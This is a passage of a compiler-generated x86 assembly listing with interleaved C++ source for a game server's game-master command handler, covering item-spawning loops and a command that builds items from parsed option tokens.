  00a92	eb 0f		 jmp	 SHORT $LN15@Management
$LN13@Management:
  00a94	8b 85 e8 fc ff
	ff		 mov	 eax, DWORD PTR _i$138[ebp]
  00a9a	83 c0 01	 add	 eax, 1
  00a9d	89 85 e8 fc ff
	ff		 mov	 DWORD PTR _i$138[ebp], eax
$LN15@Management:
  00aa3	83 bd e8 fc ff
	ff 05		 cmp	 DWORD PTR _i$138[ebp], 5
  00aaa	7d 72		 jge	 SHORT $LN14@Management

; 1589 : 			{
; 1590 : 				ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM(12,15), 0, (BYTE)0, 0, 0, 0, -1, 0, 0);

  00aac	6a 00		 push	 0
  00aae	6a 00		 push	 0
  00ab0	6a 00		 push	 0
  00ab2	6a ff		 push	 -1
  00ab4	6a 00		 push	 0
  00ab6	6a 00		 push	 0
  00ab8	6a 00		 push	 0
  00aba	6a 00		 push	 0
  00abc	6a 00		 push	 0
  00abe	6a 0f		 push	 15			; 0000000fH
  00ac0	6a 0c		 push	 12			; 0000000cH
  00ac2	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  00ac7	83 c4 08	 add	 esp, 8
  00aca	50		 push	 eax
  00acb	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00ad2	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00ad8	0f b6 94 01 06
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+262]
  00ae0	52		 push	 edx
  00ae1	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00ae8	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00aee	0f b6 94 01 04
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+260]
  00af6	52		 push	 edx
  00af7	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00afe	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00b04	0f b6 94 01 09
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+265]
  00b0c	52		 push	 edx
  00b0d	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  00b10	50		 push	 eax
  00b11	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  00b16	83 c4 38	 add	 esp, 56			; 00000038H

; 1591 : 			}

  00b19	e9 76 ff ff ff	 jmp	 $LN13@Management
$LN14@Management:

; 1592 : 
; 1593 : 			for( int i = 0; i < 5; i++ )

  00b1e	c7 85 e4 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$137[ebp], 0
  00b28	eb 0f		 jmp	 SHORT $LN18@Management
$LN16@Management:
  00b2a	8b 85 e4 fc ff
	ff		 mov	 eax, DWORD PTR _i$137[ebp]
  00b30	83 c0 01	 add	 eax, 1
  00b33	89 85 e4 fc ff
	ff		 mov	 DWORD PTR _i$137[ebp], eax
$LN18@Management:
  00b39	83 bd e4 fc ff
	ff 05		 cmp	 DWORD PTR _i$137[ebp], 5
  00b40	7d 72		 jge	 SHORT $LN17@Management

; 1594 : 			{
; 1595 : 				ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM(14,13), 0, (BYTE)0, 0, 0, 0, -1, 0, 0);

  00b42	6a 00		 push	 0
  00b44	6a 00		 push	 0
  00b46	6a 00		 push	 0
  00b48	6a ff		 push	 -1
  00b4a	6a 00		 push	 0
  00b4c	6a 00		 push	 0
  00b4e	6a 00		 push	 0
  00b50	6a 00		 push	 0
  00b52	6a 00		 push	 0
  00b54	6a 0d		 push	 13			; 0000000dH
  00b56	6a 0e		 push	 14			; 0000000eH
  00b58	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  00b5d	83 c4 08	 add	 esp, 8
  00b60	50		 push	 eax
  00b61	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00b68	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00b6e	0f b6 94 01 06
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+262]
  00b76	52		 push	 edx
  00b77	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00b7e	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00b84	0f b6 94 01 04
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+260]
  00b8c	52		 push	 edx
  00b8d	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00b94	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00b9a	0f b6 94 01 09
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+265]
  00ba2	52		 push	 edx
  00ba3	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  00ba6	50		 push	 eax
  00ba7	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  00bac	83 c4 38	 add	 esp, 56			; 00000038H

; 1596 : 			}

  00baf	e9 76 ff ff ff	 jmp	 $LN16@Management
$LN17@Management:

; 1597 : 
; 1598 : 			for( int i = 0; i < 5; i++ )

  00bb4	c7 85 e0 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$136[ebp], 0
  00bbe	eb 0f		 jmp	 SHORT $LN21@Management
$LN19@Management:
  00bc0	8b 85 e0 fc ff
	ff		 mov	 eax, DWORD PTR _i$136[ebp]
  00bc6	83 c0 01	 add	 eax, 1
  00bc9	89 85 e0 fc ff
	ff		 mov	 DWORD PTR _i$136[ebp], eax
$LN21@Management:
  00bcf	83 bd e0 fc ff
	ff 05		 cmp	 DWORD PTR _i$136[ebp], 5
  00bd6	7d 72		 jge	 SHORT $LN20@Management

; 1599 : 			{
; 1600 : 				ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, MAKE_ITEMNUM(14,14), 0, (BYTE)0, 0, 0, 0, -1, 0, 0);

  00bd8	6a 00		 push	 0
  00bda	6a 00		 push	 0
  00bdc	6a 00		 push	 0
  00bde	6a ff		 push	 -1
  00be0	6a 00		 push	 0
  00be2	6a 00		 push	 0
  00be4	6a 00		 push	 0
  00be6	6a 00		 push	 0
  00be8	6a 00		 push	 0
  00bea	6a 0e		 push	 14			; 0000000eH
  00bec	6a 0e		 push	 14			; 0000000eH
  00bee	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  00bf3	83 c4 08	 add	 esp, 8
  00bf6	50		 push	 eax
  00bf7	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00bfe	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00c04	0f b6 94 01 06
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+262]
  00c0c	52		 push	 edx
  00c0d	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00c14	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00c1a	0f b6 94 01 04
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+260]
  00c22	52		 push	 edx
  00c23	69 45 10 a0 1b
	00 00		 imul	 eax, DWORD PTR _aIndex$[ebp], 7072
  00c2a	8b 0d 00 00 00
	00		 mov	 ecx, DWORD PTR ?gObj@@3PAVOBJECTSTRUCT@@A ; gObj
  00c30	0f b6 94 01 09
	01 00 00	 movzx	 edx, BYTE PTR [ecx+eax+265]
  00c38	52		 push	 edx
  00c39	8b 45 10	 mov	 eax, DWORD PTR _aIndex$[ebp]
  00c3c	50		 push	 eax
  00c3d	e8 00 00 00 00	 call	 ?ItemSerialCreateSend@@YAXHEEEHEEEEEHEEH@Z ; ItemSerialCreateSend
  00c42	83 c4 38	 add	 esp, 56			; 00000038H

; 1601 : 			}

  00c45	e9 76 ff ff ff	 jmp	 $LN19@Management
$LN20@Management:

; 1602 : 	
; 1603 : 		}
; 1604 : 	break;

  00c4a	e9 6d 30 00 00	 jmp	 $LN2@Management
$LN80@Management:

; 1605 : 
; 1606 : 	// 
; 1607 : 	case GMCMD_MANYMANYITEM:
; 1608 : 		//if( (lpObj->AuthorityCode&AUTHORITY_CODE_SETPOSITION) != AUTHORITY_CODE_SETPOSITION) return 0;
; 1609 : 		{
; 1610 : 		int type, index, level, op1=0, op2=0, op3=0;

  00c4f	c7 85 d0 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _op1$132[ebp], 0
  00c59	c7 85 cc fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _op2$131[ebp], 0
  00c63	c7 85 c8 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _op3$130[ebp], 0

; 1611 : 		BYTE NewOption=0;

  00c6d	c6 85 c7 fc ff
	ff 00		 mov	 BYTE PTR _NewOption$129[ebp], 0

; 1612 : 		int  dur=255;

  00c74	c7 85 c0 fc ff
	ff ff 00 00 00	 mov	 DWORD PTR _dur$128[ebp], 255 ; 000000ffH

; 1613 : 
; 1614 : 		type = GetTokenNumber();

  00c7e	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00c81	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00c86	89 85 dc fc ff
	ff		 mov	 DWORD PTR _type$135[ebp], eax

; 1615 : 		index = GetTokenNumber();

  00c8c	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00c8f	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00c94	89 85 d8 fc ff
	ff		 mov	 DWORD PTR _index$134[ebp], eax

; 1616 : 		level = GetTokenNumber();

  00c9a	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00c9d	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00ca2	89 85 d4 fc ff
	ff		 mov	 DWORD PTR _level$133[ebp], eax

; 1617 : 		
; 1618 : 		dur   = GetTokenNumber();

  00ca8	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00cab	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00cb0	89 85 c0 fc ff
	ff		 mov	 DWORD PTR _dur$128[ebp], eax

; 1619 : 
; 1620 : 		op1 = GetTokenNumber();

  00cb6	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00cb9	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00cbe	89 85 d0 fc ff
	ff		 mov	 DWORD PTR _op1$132[ebp], eax

; 1621 : 		op2 = GetTokenNumber();

  00cc4	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00cc7	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00ccc	89 85 cc fc ff
	ff		 mov	 DWORD PTR _op2$131[ebp], eax

; 1622 : 		int op3temp = GetTokenNumber();

  00cd2	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00cd5	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00cda	89 85 bc fc ff
	ff		 mov	 DWORD PTR _op3temp$127[ebp], eax

; 1623 : 		
; 1624 : #ifdef FOR_BLOODCASTLE	//   !! ->  
; 1625 : //		if ((type >=0) && (type <=11))
; 1626 : //			return 0;
; 1627 : #endif
; 1628 : 
; 1629 : 		if( type == 13 && index == 3 )

  00ce0	83 bd dc fc ff
	ff 0d		 cmp	 DWORD PTR _type$135[ebp], 13 ; 0000000dH
  00ce7	75 23		 jne	 SHORT $LN81@Management
  00ce9	83 bd d8 fc ff
	ff 03		 cmp	 DWORD PTR _index$134[ebp], 3
  00cf0	75 1a		 jne	 SHORT $LN81@Management

; 1630 : 		{	//  
; 1631 : 			if( op3temp < 8 )

  00cf2	83 bd bc fc ff
	ff 08		 cmp	 DWORD PTR _op3temp$127[ebp], 8
  00cf9	7d 0c		 jge	 SHORT $LN83@Management

; 1632 : 				op3 = op3temp;

  00cfb	8b 85 bc fc ff
	ff		 mov	 eax, DWORD PTR _op3temp$127[ebp]
  00d01	89 85 c8 fc ff
	ff		 mov	 DWORD PTR _op3$130[ebp], eax
$LN83@Management:

; 1633 : 		}

  00d07	e9 91 00 00 00	 jmp	 $LN96@Management
$LN81@Management:

; 1634 : 		else
; 1635 : 		{
; 1636 : 			if( op3temp == 4 )

  00d0c	83 bd bc fc ff
	ff 04		 cmp	 DWORD PTR _op3temp$127[ebp], 4
  00d13	75 0c		 jne	 SHORT $LN84@Management

; 1637 : 			{
; 1638 : 				op3 = 1;

  00d15	c7 85 c8 fc ff
	ff 01 00 00 00	 mov	 DWORD PTR _op3$130[ebp], 1

; 1639 : 			}

  00d1f	eb 7c		 jmp	 SHORT $LN96@Management
$LN84@Management:

; 1640 : 			else if( op3temp == 8 )

  00d21	83 bd bc fc ff
	ff 08		 cmp	 DWORD PTR _op3temp$127[ebp], 8
  00d28	75 0c		 jne	 SHORT $LN86@Management

; 1641 : 			{
; 1642 : 				op3 = 2;

  00d2a	c7 85 c8 fc ff
	ff 02 00 00 00	 mov	 DWORD PTR _op3$130[ebp], 2

; 1643 : 			}

  00d34	eb 67		 jmp	 SHORT $LN96@Management
$LN86@Management:

; 1644 : 			else if( op3temp == 12 )

  00d36	83 bd bc fc ff
	ff 0c		 cmp	 DWORD PTR _op3temp$127[ebp], 12 ; 0000000cH
  00d3d	75 0c		 jne	 SHORT $LN88@Management

; 1645 : 			{
; 1646 : 				op3 = 3;

  00d3f	c7 85 c8 fc ff
	ff 03 00 00 00	 mov	 DWORD PTR _op3$130[ebp], 3

; 1647 : 			}

  00d49	eb 52		 jmp	 SHORT $LN96@Management
$LN88@Management:

; 1648 : 			else if( op3temp == 16 )

  00d4b	83 bd bc fc ff
	ff 10		 cmp	 DWORD PTR _op3temp$127[ebp], 16 ; 00000010H
  00d52	75 0c		 jne	 SHORT $LN90@Management

; 1649 : 			{
; 1650 : 				op3 = 4;

  00d54	c7 85 c8 fc ff
	ff 04 00 00 00	 mov	 DWORD PTR _op3$130[ebp], 4

; 1651 : 			}

  00d5e	eb 3d		 jmp	 SHORT $LN96@Management
$LN90@Management:

; 1652 : 			else if( op3temp == 20 )

  00d60	83 bd bc fc ff
	ff 14		 cmp	 DWORD PTR _op3temp$127[ebp], 20 ; 00000014H
  00d67	75 0c		 jne	 SHORT $LN92@Management

; 1653 : 			{
; 1654 : 				op3 = 5;

  00d69	c7 85 c8 fc ff
	ff 05 00 00 00	 mov	 DWORD PTR _op3$130[ebp], 5

; 1655 : 			}	

  00d73	eb 28		 jmp	 SHORT $LN96@Management
$LN92@Management:

; 1656 : 			else if( op3temp == 24 )

  00d75	83 bd bc fc ff
	ff 18		 cmp	 DWORD PTR _op3temp$127[ebp], 24 ; 00000018H
  00d7c	75 0c		 jne	 SHORT $LN94@Management

; 1657 : 			{
; 1658 : 				op3 = 6;

  00d7e	c7 85 c8 fc ff
	ff 06 00 00 00	 mov	 DWORD PTR _op3$130[ebp], 6

; 1659 : 			}	

  00d88	eb 13		 jmp	 SHORT $LN96@Management
$LN94@Management:

; 1660 : 			else if( op3temp == 28 )

  00d8a	83 bd bc fc ff
	ff 1c		 cmp	 DWORD PTR _op3temp$127[ebp], 28 ; 0000001cH
  00d91	75 0a		 jne	 SHORT $LN96@Management

; 1661 : 			{
; 1662 : 				op3 = 7;

  00d93	c7 85 c8 fc ff
	ff 07 00 00 00	 mov	 DWORD PTR _op3$130[ebp], 7
$LN96@Management:

; 1663 : 			}		
; 1664 : 		}
; 1665 : 		
; 1666 : 		int setoption= GetTokenNumber();		

  00d9d	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00da0	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00da5	89 85 b8 fc ff
	ff		 mov	 DWORD PTR _setoption$126[ebp], eax

; 1667 : 		int addstat= GetTokenNumber();

  00dab	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00dae	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00db3	89 85 b4 fc ff
	ff		 mov	 DWORD PTR _addstat$125[ebp], eax

; 1668 : 
; 1669 : 		
; 1670 : 		if( setoption )

  00db9	83 bd b8 fc ff
	ff 00		 cmp	 DWORD PTR _setoption$126[ebp], 0
  00dc0	74 66		 je	 SHORT $LN103@Management

; 1671 : 		{
; 1672 : 			if( addstat == 0 )

  00dc2	83 bd b4 fc ff
	ff 00		 cmp	 DWORD PTR _addstat$125[ebp], 0
  00dc9	75 34		 jne	 SHORT $LN98@Management

; 1673 : 			{
; 1674 : 				if( rand()%100 < 80 )

  00dcb	e8 00 00 00 00	 call	 _rand
  00dd0	99		 cdq
  00dd1	b9 64 00 00 00	 mov	 ecx, 100		; 00000064H
  00dd6	f7 f9		 idiv	 ecx
  00dd8	83 fa 50	 cmp	 edx, 80			; 00000050H
  00ddb	7d 11		 jge	 SHORT $LN100@Management

; 1675 : 					setoption |= 0x04;

  00ddd	8b 85 b8 fc ff
	ff		 mov	 eax, DWORD PTR _setoption$126[ebp]
  00de3	83 c8 04	 or	 eax, 4
  00de6	89 85 b8 fc ff
	ff		 mov	 DWORD PTR _setoption$126[ebp], eax
  00dec	eb 0f		 jmp	 SHORT $LN101@Management
$LN100@Management:

; 1676 : 				else
; 1677 : 					setoption |= 0x08;

  00dee	8b 85 b8 fc ff
	ff		 mov	 eax, DWORD PTR _setoption$126[ebp]
  00df4	83 c8 08	 or	 eax, 8
  00df7	89 85 b8 fc ff
	ff		 mov	 DWORD PTR _setoption$126[ebp], eax
$LN101@Management:

; 1678 : 			}

  00dfd	eb 29		 jmp	 SHORT $LN103@Management
$LN98@Management:

; 1679 : 			else
; 1680 : 			{
; 1681 : 				if( addstat == 1 )

  00dff	83 bd b4 fc ff
	ff 01		 cmp	 DWORD PTR _addstat$125[ebp], 1
  00e06	75 11		 jne	 SHORT $LN102@Management

; 1682 : 					setoption |= 0x04;

  00e08	8b 85 b8 fc ff
	ff		 mov	 eax, DWORD PTR _setoption$126[ebp]
  00e0e	83 c8 04	 or	 eax, 4
  00e11	89 85 b8 fc ff
	ff		 mov	 DWORD PTR _setoption$126[ebp], eax
  00e17	eb 0f		 jmp	 SHORT $LN103@Management
$LN102@Management:

; 1683 : 				else
; 1684 : 					setoption |= 0x08;

  00e19	8b 85 b8 fc ff
	ff		 mov	 eax, DWORD PTR _setoption$126[ebp]
  00e1f	83 c8 08	 or	 eax, 8
  00e22	89 85 b8 fc ff
	ff		 mov	 DWORD PTR _setoption$126[ebp], eax
$LN103@Management:

; 1685 : 			}
; 1686 : 		}		
; 1687 : 
; 1688 : 		int nop1= GetTokenNumber();

  00e28	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00e2b	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00e30	89 85 b0 fc ff
	ff		 mov	 DWORD PTR _nop1$124[ebp], eax

; 1689 : 		if( nop1 > 0 ) NewOption |= 0x20;

  00e36	83 bd b0 fc ff
	ff 00		 cmp	 DWORD PTR _nop1$124[ebp], 0
  00e3d	7e 10		 jle	 SHORT $LN104@Management
  00e3f	0f b6 85 c7 fc
	ff ff		 movzx	 eax, BYTE PTR _NewOption$129[ebp]
  00e46	83 c8 20	 or	 eax, 32			; 00000020H
  00e49	88 85 c7 fc ff
	ff		 mov	 BYTE PTR _NewOption$129[ebp], al
$LN104@Management:

; 1690 : 		int nop2= GetTokenNumber();

  00e4f	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00e52	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00e57	89 85 ac fc ff
	ff		 mov	 DWORD PTR _nop2$123[ebp], eax

; 1691 : 		if( nop2 > 0 ) NewOption |= 0x10;

  00e5d	83 bd ac fc ff
	ff 00		 cmp	 DWORD PTR _nop2$123[ebp], 0
  00e64	7e 10		 jle	 SHORT $LN105@Management
  00e66	0f b6 85 c7 fc
	ff ff		 movzx	 eax, BYTE PTR _NewOption$129[ebp]
  00e6d	83 c8 10	 or	 eax, 16			; 00000010H
  00e70	88 85 c7 fc ff
	ff		 mov	 BYTE PTR _NewOption$129[ebp], al
$LN105@Management:

; 1692 : 		int nop3= GetTokenNumber();

  00e76	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00e79	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00e7e	89 85 a8 fc ff
	ff		 mov	 DWORD PTR _nop3$122[ebp], eax

; 1693 : 		if( nop3 > 0 ) NewOption |= 0x08;

  00e84	83 bd a8 fc ff
	ff 00		 cmp	 DWORD PTR _nop3$122[ebp], 0
  00e8b	7e 10		 jle	 SHORT $LN106@Management
  00e8d	0f b6 85 c7 fc
	ff ff		 movzx	 eax, BYTE PTR _NewOption$129[ebp]
  00e94	83 c8 08	 or	 eax, 8
  00e97	88 85 c7 fc ff
	ff		 mov	 BYTE PTR _NewOption$129[ebp], al
$LN106@Management:

; 1694 : 		int nop4= GetTokenNumber();

  00e9d	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00ea0	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00ea5	89 85 a4 fc ff
	ff		 mov	 DWORD PTR _nop4$121[ebp], eax

; 1695 : 		if( nop4 > 0 ) NewOption |= 0x04;

  00eab	83 bd a4 fc ff
	ff 00		 cmp	 DWORD PTR _nop4$121[ebp], 0
  00eb2	7e 10		 jle	 SHORT $LN107@Management
  00eb4	0f b6 85 c7 fc
	ff ff		 movzx	 eax, BYTE PTR _NewOption$129[ebp]
  00ebb	83 c8 04	 or	 eax, 4
  00ebe	88 85 c7 fc ff
	ff		 mov	 BYTE PTR _NewOption$129[ebp], al
$LN107@Management:

; 1696 : 		int nop5= GetTokenNumber();

  00ec4	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00ec7	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00ecc	89 85 a0 fc ff
	ff		 mov	 DWORD PTR _nop5$120[ebp], eax

; 1697 : 		if( nop5 > 0 ) NewOption |= 0x02;

  00ed2	83 bd a0 fc ff
	ff 00		 cmp	 DWORD PTR _nop5$120[ebp], 0
  00ed9	7e 10		 jle	 SHORT $LN108@Management
  00edb	0f b6 85 c7 fc
	ff ff		 movzx	 eax, BYTE PTR _NewOption$129[ebp]
  00ee2	83 c8 02	 or	 eax, 2
  00ee5	88 85 c7 fc ff
	ff		 mov	 BYTE PTR _NewOption$129[ebp], al
$LN108@Management:

; 1698 : 		int nop6= GetTokenNumber();

  00eeb	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00eee	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00ef3	89 85 9c fc ff
	ff		 mov	 DWORD PTR _nop6$119[ebp], eax

; 1699 : 		if( nop6 > 0 ) NewOption |= 0x01;		

  00ef9	83 bd 9c fc ff
	ff 00		 cmp	 DWORD PTR _nop6$119[ebp], 0
  00f00	7e 10		 jle	 SHORT $LN109@Management
  00f02	0f b6 85 c7 fc
	ff ff		 movzx	 eax, BYTE PTR _NewOption$129[ebp]
  00f09	83 c8 01	 or	 eax, 1
  00f0c	88 85 c7 fc ff
	ff		 mov	 BYTE PTR _NewOption$129[ebp], al
$LN109@Management:

; 1700 : 		
; 1701 : 		if( (type >= 0 && type < MAX_ITEM_INDEX) &&

  00f12	83 bd dc fc ff
	ff 00		 cmp	 DWORD PTR _type$135[ebp], 0
  00f19	0f 8c 41 01 00
	00		 jl	 $LN23@Management
  00f1f	83 bd dc fc ff
	ff 20		 cmp	 DWORD PTR _type$135[ebp], 32 ; 00000020H
  00f26	0f 8d 34 01 00
	00		 jge	 $LN23@Management
  00f2c	83 bd d8 fc ff
	ff 00		 cmp	 DWORD PTR _index$134[ebp], 0
  00f33	0f 8c 27 01 00
	00		 jl	 $LN23@Management
  00f39	83 bd d8 fc ff
	ff 20		 cmp	 DWORD PTR _index$134[ebp], 32 ; 00000020H
  00f40	0f 8d 1a 01 00
	00		 jge	 $LN23@Management

; 1702 : 			(index>= 0 && index< MAX_ITEM_INDEX) )
; 1703 : 		{
; 1704 : 			int itemtype = ItemGetNumberMake( type, index);

  00f46	8b 85 d8 fc ff
	ff		 mov	 eax, DWORD PTR _index$134[ebp]
  00f4c	50		 push	 eax
  00f4d	8b 8d dc fc ff
	ff		 mov	 ecx, DWORD PTR _type$135[ebp]
  00f53	51		 push	 ecx
  00f54	e8 00 00 00 00	 call	 ?ItemGetNumberMake@@YAHHH@Z ; ItemGetNumberMake
  00f59	83 c4 08	 add	 esp, 8
  00f5c	89 85 98 fc ff
	ff		 mov	 DWORD PTR _itemtype$118[ebp], eax

; 1705 : 
; 1706 : 			if( itemtype == MAKE_ITEMNUM(0, 19) || 
; 1707 : 				itemtype == MAKE_ITEMNUM(4, 18) || 

  00f62	6a 13		 push	 19			; 00000013H
  00f64	6a 00		 push	 0
  00f66	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  00f6b	83 c4 08	 add	 esp, 8
  00f6e	39 85 98 fc ff
	ff		 cmp	 DWORD PTR _itemtype$118[ebp], eax
  00f74	74 28		 je	 SHORT $LN112@Management
  00f76	6a 12		 push	 18			; 00000012H
  00f78	6a 04		 push	 4
  00f7a	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  00f7f	83 c4 08	 add	 esp, 8
  00f82	39 85 98 fc ff
	ff		 cmp	 DWORD PTR _itemtype$118[ebp], eax
  00f88	74 14		 je	 SHORT $LN112@Management
  00f8a	6a 0a		 push	 10			; 0000000aH
  00f8c	6a 05		 push	 5
  00f8e	e8 00 00 00 00	 call	 ?MakeItemNumber@@YAHHH@Z ; MakeItemNumber
  00f93	83 c4 08	 add	 esp, 8
  00f96	39 85 98 fc ff
	ff		 cmp	 DWORD PTR _itemtype$118[ebp], eax
  00f9c	75 07		 jne	 SHORT $LN111@Management
$LN112@Management:

; 1708 : 				itemtype == MAKE_ITEMNUM(5, 10)
; 1709 : #ifdef ADD_WEAPON_OF_ARCHANGEL_SCEPTER_20050706
; 1710 : 				|| itemtype == MAKE_ITEMNUM(2, 13)
; 1711 : #endif
; 1712 : 			  )
; 1713 : 			{	//       
; 1714 : 				NewOption = 0x3f;

  00f9e	c6 85 c7 fc ff
	ff 3f		 mov	 BYTE PTR _NewOption$129[ebp], 63 ; 0000003fH
$LN111@Management:

; 1715 : 			}
; 1716 : 
; 1717 : 			for( int i = 0; i < 15; i++ )

  00fa5	c7 85 94 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$117[ebp], 0
  00faf	eb 0f		 jmp	 SHORT $LN24@Management
$LN22@Management:
  00fb1	8b 85 94 fc ff
	ff		 mov	 eax, DWORD PTR _i$117[ebp]
  00fb7	83 c0 01	 add	 eax, 1
  00fba	89 85 94 fc ff
	ff		 mov	 DWORD PTR _i$117[ebp], eax
$LN24@Management:
  00fc0	83 bd 94 fc ff
	ff 0f		 cmp	 DWORD PTR _i$117[ebp], 15 ; 0000000fH
  00fc7	0f 8d 93 00 00
	00		 jge	 $LN23@Management

; 1718 : 			{			
; 1719 : 				ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, itemtype, level, (BYTE)dur, op1, op2, op3, -1, NewOption, setoption);

  00fcd	6a 00		 push	 0
  00fcf	0f b6 85 b8 fc
	ff ff		 movzx	 eax, BYTE PTR _setoption$126[ebp]
  00fd6	50		 push	 eax
  00fd7	0f b6 8d c7 fc
	ff ff		 movzx	 ecx, BYTE PTR _NewOption$129[ebp]
  00fde	51		 push	 ecx
  00fdf	6a ff		 push	 -1
  00fe1	0f b6 95 c8 fc
	ff ff		 movzx	 edx, BYTE PTR _op3$130[ebp]
  00fe8	52		 push	 edx
  00fe9	0f b6 85 cc fc
	ff ff		 movzx	 eax, BYTE PTR _op2$131[ebp]
  00ff0	50		 push	 eax
  00ff1	0f b6 8d d0 fc
	ff ff		 movzx	 ecx, BYTE PTR _op1$132[ebp]
  00ff8	51		 push	 ecx
  00ff9	0f b6 95 c0 fc
	ff ff		 movzx	 edx, BYTE PTR _dur$128[ebp]
  01000	52		 push	 edx
  01001	0f b6 85 d4 fc
